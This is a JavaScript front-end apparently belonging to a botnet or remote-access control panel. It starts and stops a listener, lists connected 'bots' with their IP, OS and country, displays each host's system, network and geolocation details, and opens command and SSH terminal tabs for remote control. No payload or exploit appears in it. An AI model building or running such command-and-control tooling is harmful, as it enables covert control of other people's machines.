'use strict';

const botsFetchInterval = 10; // seconds

let isFetchingBots = false;
let isServerActive = false;
let isProcessingBot = false;
let isTogglingServer = false;

let botsSignature = null;
let terminalObj = null;

$(document).ready(function () {
    updateStatus();
    setInterval(updateStatus, botsFetchInterval * 1000);
});

// Server

function updateStatus() {
    getServerStatus()
        .done((resp) => {
            isServerActive = resp['isActive'];

            if (isServerActive) {
                $('#server-ip-display').text(resp['ip']);
                $('#server-port-display').text(resp['port']);

                $('#server-ip').val(resp['ip']);
                $('#server-port').val(resp['port']);

                setServerStatusActive();
            } else {
                if ($('#server-ip-display').text() !== '----') {
                    $('#server-ip-display').text('----');
                    $('#server-port-display').text('----');
                    setServerStatusInactive();
                }
            }

            if (isTogglingServer) {
                isTogglingServer = false;
                $('#server-toggle-loader').addClass('d-none');
                $('#server-active-toggle').removeClass('d-none');
            }

            fetchBots();
        })
        .fail(() => {
            location.reload();
        });
}

function getServerStatus() {
    return $.ajax({
        type: 'GET',
        url: '/server-status',
        beforeSend: (request) => {
            request.setRequestHeader('X-CSRFToken', $('#csrf_token').val());
        },
    });
}

function setServerStatusActive() {
    $('#server-active-toggle').text('Stop Server');
    $('#server-active-toggle').addClass('btn-danger');
    $('#server-active-toggle').removeClass('btn-primary');

    $('#server-ip').prop('disabled', true);
    $('#server-port').prop('disabled', true);
}

function setServerStatusInactive() {
    $('#server-active-toggle').text('Start Server');
    $('#server-active-toggle').addClass('btn-primary');
    $('#server-active-toggle').removeClass('btn-danger');

    $('#server-ip').prop('disabled', false);
    $('#server-port').prop('disabled', false);

    disableConsole();
    $('#bots-display').text('');
}

$('#server-active-toggle').click(() => {
    if (isTogglingServer) {
        return;
    }

    isTogglingServer = true;
    let url = isServerActive ? '/stop-server' : '/start-server';
    let data = !isServerActive ? { ip: $('#server-ip').val(), port: $('#server-port').val() } : {};

    if (
        !isServerActive &&
        ($('#server-ip').val().trim().length === 0 || $('#server-port').val().trim().length === 0)
    ) {
        return;
    }

    $('#server-toggle-loader').removeClass('d-none');
    $('#server-active-toggle').addClass('d-none');

    $.ajax({
        type: 'POST',
        url: url,
        data: data,
        beforeSend: (request) => {
            request.setRequestHeader('X-CSRFToken', $('#csrf_token').val());
        },
    })
        .done((resp) => {
            updateStatus();
        })
        .fail(() => {
            isTogglingServer = false;
            $('#server-toggle-loader').addClass('d-none');
            $('#server-active-toggle').removeClass('d-none');
        });
});

// Bots

function fetchBots() {
    if (isFetchingBots) {
        return;
    }

    $.ajax({
        type: 'GET',
        url: '/fetch-bots',
        beforeSend: (request) => {
            request.setRequestHeader('X-CSRFToken', $('#csrf_token').val());
        },
    })
        .done((resp) => {
            $('#bots-count').text(isServerActive ? resp['bots'].length : '----');

            if (botsSignature === null || botsSignature !== resp['signature']) {
                botsSignature = resp['signature'];
                $('#bots-display').text('');
                processBots(resp['bots']);
            }

            isFetchingBots = false;
        })
        .fail(() => {
            isFetchingBots = false;
        });
}

function processBots(bots) {
    let tableRow;

    if (bots == undefined) {
        location.reload();
    }

    bots.forEach((bot) => {
        tableRow = $('<tr>');

        tableRow.append(
            $('<td>', { 'data-bot-id': bot['id'], class: 'clickable' })
                .text(bot['id'].slice(0, 8))
                .click((e) => {
                    exploreBot(e.currentTarget.getAttribute('data-bot-id'));
                })
        );

        tableRow.append($('<td>').text(bot['ip']));
        tableRow.append($('<td>').text(bot['os']));
        tableRow.append($('<td>').text(bot['country']));

        $('#bots-display').append(tableRow);
    });
}

function exploreBot(botId) {
    if (isProcessingBot) {
        return;
    }

    isProcessingBot = true;

    $.ajax({
        type: 'POST',
        url: '/get-bot-info',
        data: { 'bot-id': botId },
        beforeSend: (request) => {
            request.setRequestHeader('X-CSRFToken', $('#csrf_token').val());
        },
    })
        .done((resp) => {
            $('#info-display').text('');

            if (resp['status'] === 0) {
                let data = resp['data'];

                let sysInfo = $('<div>', { class: 'info-section' });
                let netInfo = $('<div>', { class: 'info-section' });
                let geoInfo = $('<div>', { class: 'info-section' });

                sysInfo.append($('<span>', { class: 'info-section-title' }).text('System'));
                netInfo.append($('<span>', { class: 'info-section-title' }).text('Network'));
                geoInfo.append($('<span>', { class: 'info-section-title' }).text('Geolocation'));

                // System
                sysInfo.append(
                    $('<span>', { class: 'info-row' })
                        .append($('<span>', { class: 'info-row-title' }).text('ID'))
                        .append($('<span>', { class: 'info-row-value' }).text(botId.slice(0, 8)))
                );

                for (let k in data['system']) {
                    sysInfo.append(
                        $('<span>', { class: 'info-row' })
                            .append($('<span>', { class: 'info-row-title' }).text(k))
                            .append($('<span>', { class: 'info-row-value' }).text(data['system'][k]))
                    );
                }

                // Network
                for (let k in data['network']) {
                    netInfo.append(
                        $('<span>', { class: 'info-row' })
                            .append($('<span>', { class: 'info-row-title' }).text(k))
                            .append($('<span>', { class: 'info-row-value' }).text(data['network'][k]))
                    );
                }

                // Geolocation
                for (let k in data['geolocation']) {
                    geoInfo.append(
                        $('<span>', { class: 'info-row' })
                            .append($('<span>', { class: 'info-row-title' }).text(k))
                            .append($('<span>', { class: 'info-row-value' }).text(data['geolocation'][k]))
                    );
                }

                $('#info-display').append(sysInfo).append(netInfo).append(geoInfo);

                restTerminal();
                terminalObj = new Command();
                activateCommand($('#command')[0]);
            }

            isProcessingBot = false;
        })
        .fail(() => {
            isProcessingBot = false;
            disableInput();
            disabledTerminalObj();
        });
}

function restTerminal() {
    Terminal.commandOutputHistory = [];
    Terminal.SSHOutputHistory = [];

    Terminal.commandConsoleHistory = [];
    Terminal.commandCurrentPosition = 0;

    Terminal.SSHConsoleHistory = [];
    Terminal.SSHCurrentPosition = 0;

    Terminal.commandCurrentInput = '';
    Terminal.SSHCurrenInput = '';
}

$('#command').click((e) => {
    activateCommand(e.currentTarget);
});

$('#ssh').click((e) => {
    activateSSH(e.currentTarget);
});

function activateCommand(currentTab) {
    if (activateTab(currentTab) !== 0) {
        return;
    }

    if (terminalObj.constructor !== new Command().constructor) {
        terminalObj = new Command();
    }
}

function activateSSH(currentTab) {
    if (activateTab(currentTab) !== 0) {
        return;
    }

    if (terminalObj.constructor !== new SSH().constructor) {
        terminalObj = new SSH();
    }
}

function activateTab(currentTab) {
    if (terminalObj === null || isActiveTab(currentTab)) {
        return -1;
    }

    return activeTab(currentTab);
}

function activeTab(currentTab) {
    $(currentTab).addClass('active-tab');

    $('.console ul.nav li').each((_, ele) => {
        if (ele !== currentTab) {
            $(ele).removeClass('active-tab');
        }
    });

    return 0;
}

function isActiveTab(currentTab) {
    return $(currentTab).hasClass('active-tab');
}
